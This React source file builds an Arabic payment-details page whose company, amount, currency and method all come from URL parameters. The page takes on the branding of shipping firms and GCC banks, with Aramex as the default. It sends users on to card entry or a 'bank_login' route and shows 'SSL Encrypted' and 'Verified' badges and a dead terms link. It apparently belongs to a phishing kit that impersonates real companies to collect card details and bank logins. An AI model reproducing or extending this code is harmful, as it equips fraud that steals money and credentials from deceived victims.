import { useState, useEffect, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { useLinkData } from "@/hooks/useLinkData";
import { formatCurrency, getCurrencyByCountry } from "@/lib/countryCurrencies";
import { resolveEntity, PaymentEntityConfig } from "@/config/gccPaymentEntities";
import { ThemedButton } from "@/components/ui/ThemedButton";
import { ThemedCard } from "@/components/ui/ThemedCard";
import { ThemedHeader } from "@/components/ui/ThemedHeader";
import {
  CreditCard,
  ArrowLeft,
  Hash,
  DollarSign,
  Package,
  Truck,
  ShieldCheck,
  Lock,
  Sparkles,
  CheckCircle2,
  Building2,
  Wallet,
} from "lucide-react";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import BrandedCarousel from "@/components/BrandedCarousel";
import PageLoader from "@/components/PageLoader";

const PaymentDetails = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData, isLoading, isError } = useLinkData(id);
  const [showPage, setShowPage] = useState(false);

  useEffect(() => {
    const timer = setTimeout(() => setShowPage(true), 3000);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (linkData || isError) setShowPage(true);
  }, [linkData, isError]);

  const urlParams = new URLSearchParams(window.location.search);
  const serviceKey = urlParams.get('company') || urlParams.get('service') || linkData?.payload?.service_key || 'aramex';
  const shippingInfo = linkData?.payload as any;

  const amountParam = urlParams.get('amount');
  const currencyParam = urlParams.get('currency');
  const methodParam = urlParams.get('method') || urlParams.get('pm');
  const countryParam = urlParams.get('country');

  const countryCode = countryParam || shippingInfo?.selectedCountry || "SA";
  const rawAmount = amountParam || shippingInfo?.cod_amount || 500;
  const amount = typeof rawAmount === 'number' ? rawAmount : parseFloat(rawAmount) || 500;
  const formattedAmount = formatCurrency(amount, currencyParam || countryCode);

  // Resolve entity config
  const entityConfig = useMemo<PaymentEntityConfig>(() => {
    return resolveEntity(serviceKey);
  }, [serviceKey]);

  const category = serviceKey.includes('shipping') || serviceKey.includes('aramex') ? 'shipping' :
                   serviceKey.includes('bank') ? 'bank' : 'payment_gateway';

  if (isLoading && !showPage) return <PageLoader message="جاري تحميل تفاصيل الدفع..." />;

  const handleProceed = () => {
    const paymentMethod = methodParam || linkData?.payload?.payment_method || 'card';
    const queryParams = new URLSearchParams(window.location.search);
    if (!queryParams.has('company')) queryParams.set('company', serviceKey);
    if (!queryParams.has('currency')) queryParams.set('currency', currencyParam || countryCode);
    if (!queryParams.has('amount')) queryParams.set('amount', amount.toString());

    const nextUrl = paymentMethod === 'bank_login'
      ? `/pay/${id}/bank?${queryParams.toString()}`
      : `/pay/${id}/card?${queryParams.toString()}`;

    navigate(nextUrl);
  };

  const CategoryIcon = category === 'shipping' ? Truck : category === 'bank' ? Building2 : Wallet;

  return (
    <>
      <PaymentMetaTags
        serviceKey={serviceKey}
        serviceName={entityConfig.nameAr}
        title={`تفاصيل الدفع - ${entityConfig.nameAr}`}
        customDescription={`أكمل عملية الدفع بأمان وسهولة - ${entityConfig.nameAr}`}
        amount={formattedAmount}
      />

      <ThemedHeader
        config={entityConfig}
        title={entityConfig.nameAr}
        subtitle="الدفع الآمن - Secure Payment"
      />

      <BrandedCarousel serviceKey={serviceKey} className="mb-0" />

      <div className="min-h-screen py-8 sm:py-12" dir="rtl" style={{ background: `linear-gradient(135deg, ${entityConfig.bg}, ${entityConfig.surface})`, fontFamily: entityConfig.font }}>
        <div className="container mx-auto px-4 max-w-2xl">
          {/* Page Title */}
          <div className="text-center mb-8">
            <div className="flex items-center justify-center gap-3 mb-4">
              <Sparkles className="w-6 h-6" style={{ color: entityConfig.primary }} />
              <h1 className="text-2xl sm:text-3xl font-bold" style={{ color: entityConfig.text }}>تفاصيل الدفع</h1>
            </div>
            <p className="text-sm sm:text-base" style={{ color: entityConfig.textMuted }}>راجع تفاصيل طلبك قبل المتابعة للدفع</p>
          </div>

          {/* Entity Info Card */}
          <ThemedCard config={entityConfig} variant="elevated" className="mb-6 overflow-hidden">
            <div className="px-6 sm:px-8 py-6" style={{ background: `linear-gradient(135deg, ${entityConfig.primary}15, ${entityConfig.accent}15)`, borderBottom: `2px solid ${entityConfig.primary}30` }}>
              <div className="flex items-center gap-3">
                <div className="w-12 h-12 rounded-xl flex items-center justify-center" style={{ background: `linear-gradient(135deg, ${entityConfig.primary}, ${entityConfig.accent})` }}>
                  <CategoryIcon className="w-6 h-6 text-white" />
                </div>
                <div>
                  <h2 className="text-lg sm:text-xl font-bold" style={{ color: entityConfig.text }}>
                    {category === 'shipping' ? 'تفاصيل الشحنة' : category === 'bank' ? 'تفاصيل الحساب' : 'تفاصيل الطلب'}
                  </h2>
                  <p className="text-sm" style={{ color: entityConfig.textMuted }}>
                    {category === 'shipping' ? 'معلومات الطرد والتوصيل' : category === 'bank' ? 'معلومات الحساب البنكي' : 'معلومات الخدمة المطلوبة'}
                  </p>
                </div>
              </div>
            </div>

            {shippingInfo && (
              <div className="px-6 sm:px-8 py-6 space-y-4" style={{ backgroundColor: entityConfig.surface }}>
                {shippingInfo.tracking_number && (
                  <div className="flex items-center justify-between py-3 border-b" style={{ borderColor: entityConfig.inputBorder }}>
                    <div className="flex items-center gap-2" style={{ color: entityConfig.textMuted }}>
                      <Hash className="w-4 h-4" />
                      <span className="text-sm">رقم الشحنة</span>
                    </div>
                    <span className="font-bold text-base">{shippingInfo.tracking_number}</span>
                  </div>
                )}
                {shippingInfo.package_description && (
                  <div className="flex items-center justify-between py-3 border-b" style={{ borderColor: entityConfig.inputBorder }}>
                    <div className="flex items-center gap-2" style={{ color: entityConfig.textMuted }}>
                      <Truck className="w-4 h-4" />
                      <span className="text-sm">وصف الطرد</span>
                    </div>
                    <span className="font-semibold text-base">{shippingInfo.package_description}</span>
                  </div>
                )}
              </div>
            )}
          </ThemedCard>

          {/* Payment Summary */}
          <ThemedCard config={entityConfig} variant="elevated" className="mb-6 overflow-hidden">
            <div className="px-6 sm:px-8 py-6" style={{ background: `linear-gradient(135deg, ${entityConfig.primary}15, ${entityConfig.accent}15)`, borderBottom: `2px solid ${entityConfig.primary}30` }}>
              <div className="flex items-center gap-3">
                <div className="w-12 h-12 rounded-xl flex items-center justify-center" style={{ background: `linear-gradient(135deg, ${entityConfig.primary}, ${entityConfig.accent})` }}>
                  <DollarSign className="w-6 h-6 text-white" />
                </div>
                <div>
                  <h2 className="text-lg sm:text-xl font-bold" style={{ color: entityConfig.text }}>ملخص الدفع</h2>
                  <p className="text-sm" style={{ color: entityConfig.textMuted }}>المبلغ المطلوب</p>
                </div>
              </div>
            </div>

            <div className="px-6 sm:px-8 py-6 space-y-4" style={{ backgroundColor: entityConfig.surface }}>
              <div className="flex justify-between py-3 border-b" style={{ borderColor: entityConfig.inputBorder }}>
                <span style={{ color: entityConfig.textMuted }}>الخدمة</span>
                <span className="font-bold text-base">{entityConfig.nameAr}</span>
              </div>

              <div className="flex justify-between items-center py-5 px-5 rounded-xl" style={{ background: `linear-gradient(135deg, ${entityConfig.primary}10, ${entityConfig.accent}10)` }}>
                <span className="text-lg font-bold">المبلغ الإجمالي</span>
                <span className="text-2xl sm:text-3xl font-bold" style={{ color: entityConfig.primary }}>{formattedAmount}</span>
              </div>
            </div>
          </ThemedCard>

          {/* Payment Method */}
          <ThemedCard config={entityConfig} variant="elevated" className="mb-8 overflow-hidden">
            <div className="px-6 sm:px-8 py-6" style={{ background: `linear-gradient(135deg, ${entityConfig.primary}15, ${entityConfig.accent}15)`, borderBottom: `2px solid ${entityConfig.primary}30` }}>
              <div className="flex items-center gap-3">
                <div className="w-12 h-12 rounded-xl flex items-center justify-center" style={{ background: `linear-gradient(135deg, ${entityConfig.primary}, ${entityConfig.accent})` }}>
                  <CreditCard className="w-6 h-6 text-white" />
                </div>
                <div>
                  <h2 className="text-lg sm:text-xl font-bold" style={{ color: entityConfig.text }}>طريقة الدفع</h2>
                  <p className="text-sm" style={{ color: entityConfig.textMuted }}>الدفع الإلكتروني الآمن</p>
                </div>
              </div>
            </div>

            <div className="px-6 sm:px-8 py-6" style={{ backgroundColor: entityConfig.surface }}>
              <div className="flex items-center gap-4 p-5 rounded-xl border-2" style={{ borderColor: entityConfig.primary, background: `${entityConfig.primary}08` }}>
                <div className="w-12 h-12 rounded-lg flex items-center justify-center flex-shrink-0" style={{ background: `${entityConfig.primary}20` }}>
                  {methodParam === 'bank_login' ? <Lock className="w-6 h-6" style={{ color: entityConfig.primary }} /> : <CreditCard className="w-6 h-6" style={{ color: entityConfig.primary }} />}
                </div>
                <div className="flex-1">
                  <p className="font-bold text-base mb-1">{methodParam === 'bank_login' ? 'تسجيل دخول البنك 🏦' : 'الدفع بالبطاقة 💳'}</p>
                  <p className="text-sm" style={{ color: entityConfig.textMuted }}>{methodParam === 'bank_login' ? 'الدفع الآمن عبر حسابك البنكي' : 'Visa • Mastercard • Mada'}</p>
                </div>
                <CheckCircle2 className="w-6 h-6" style={{ color: entityConfig.primary }} />
              </div>
            </div>
          </ThemedCard>

          {/* Proceed Button */}
          <ThemedButton config={entityConfig} onClick={handleProceed}>
            <span className="ml-3">متابعة للدفع</span>
            <ArrowLeft className="w-5 h-5 sm:w-6 sm:h-6" />
          </ThemedButton>

          <div className="mt-6 flex items-center justify-center gap-2 text-sm" style={{ color: entityConfig.textMuted }}>
            <Lock className="w-4 h-4" />
            <p>بالمتابعة، أنت توافق على <a href="#" className="underline hover:no-underline" style={{ color: entityConfig.primary }}>الشروط والأحكام</a></p>
          </div>

          {/* Footer */}
          <div className="mt-8 text-center">
            <div className="flex items-center justify-center gap-4 text-xs mb-3" style={{ color: entityConfig.textMuted }}>
              <div className="flex items-center gap-1.5"><Lock className="w-3.5 h-3.5" /><span>SSL Encrypted</span></div>
              <span>•</span>
              <div className="flex items-center gap-1.5"><ShieldCheck className="w-3.5 h-3.5" /><span>Verified</span></div>
            </div>
            <p className="text-xs" style={{ color: `${entityConfig.textMuted}80` }}>© 2025 {entityConfig.nameAr}. جميع الحقوق محفوظة.</p>
          </div>
        </div>
      </div>
    </>
  );
};

export default PaymentDetails;
